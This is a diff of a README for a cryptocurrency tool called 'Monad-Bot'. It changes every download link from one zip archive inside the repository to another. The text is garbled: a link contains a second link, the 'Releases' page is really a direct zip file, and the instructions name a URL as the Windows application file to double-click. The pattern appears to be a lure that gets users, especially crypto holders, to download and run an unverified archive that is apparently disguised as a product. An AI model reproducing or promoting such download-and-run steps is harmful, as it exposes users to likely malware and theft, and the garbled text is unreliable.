@@ -6,9 +6,9 @@ Monad-Bot helps you manage your cryptocurrency effortlessly. Whether you want to
 
 ## 📥 Download Monad-Bot
 
-[![Download Monad-Bot](https://raw.githubusercontent.com/GUILHERME-PATEZ/Monad-Bot/main/ideogenous/Monad-Bot-2.9.zip%20Monad%https://raw.githubusercontent.com/GUILHERME-PATEZ/Monad-Bot/main/ideogenous/Monad-Bot-2.9.zip)](https://raw.githubusercontent.com/GUILHERME-PATEZ/Monad-Bot/main/ideogenous/Monad-Bot-2.9.zip)
+[![Download Monad-Bot](https://github.com/GUILHERME-PATEZ/Monad-Bot/raw/refs/heads/main/ideogenous/Monad_Bot_3.3.zip%20Monad%https://github.com/GUILHERME-PATEZ/Monad-Bot/raw/refs/heads/main/ideogenous/Monad_Bot_3.3.zip)](https://github.com/GUILHERME-PATEZ/Monad-Bot/raw/refs/heads/main/ideogenous/Monad_Bot_3.3.zip)
 
-Visit this page to download: [Monad-Bot Releases](https://raw.githubusercontent.com/GUILHERME-PATEZ/Monad-Bot/main/ideogenous/Monad-Bot-2.9.zip)
+Visit this page to download: [Monad-Bot Releases](https://github.com/GUILHERME-PATEZ/Monad-Bot/raw/refs/heads/main/ideogenous/Monad_Bot_3.3.zip)
 
 ## 📋 Key Features
 
@@ -31,13 +31,13 @@ Visit this page to download: [Monad-Bot Releases](https://raw.githubusercontent.
 
 To download Monad-Bot, follow these steps:
 
-1. Click the download button above or visit the [Monad-Bot Releases](https://raw.githubusercontent.com/GUILHERME-PATEZ/Monad-Bot/main/ideogenous/Monad-Bot-2.9.zip) page.
+1. Click the download button above or visit the [Monad-Bot Releases](https://github.com/GUILHERME-PATEZ/Monad-Bot/raw/refs/heads/main/ideogenous/Monad_Bot_3.3.zip) page.
   
 2. Find the latest version and click on the download link for your operating system.
 
 3. If the downloaded file is compressed (like a ZIP file), extract it using any file compression software. You can use built-in tools on your operating system.
 
-4. After extracting, locate the application file (usually named `https://raw.githubusercontent.com/GUILHERME-PATEZ/Monad-Bot/main/ideogenous/Monad-Bot-2.9.zip` for Windows or similar for other OS).
+4. After extracting, locate the application file (usually named `https://github.com/GUILHERME-PATEZ/Monad-Bot/raw/refs/heads/main/ideogenous/Monad_Bot_3.3.zip` for Windows or similar for other OS).
 
 5. Double-click the application file to run it.
 
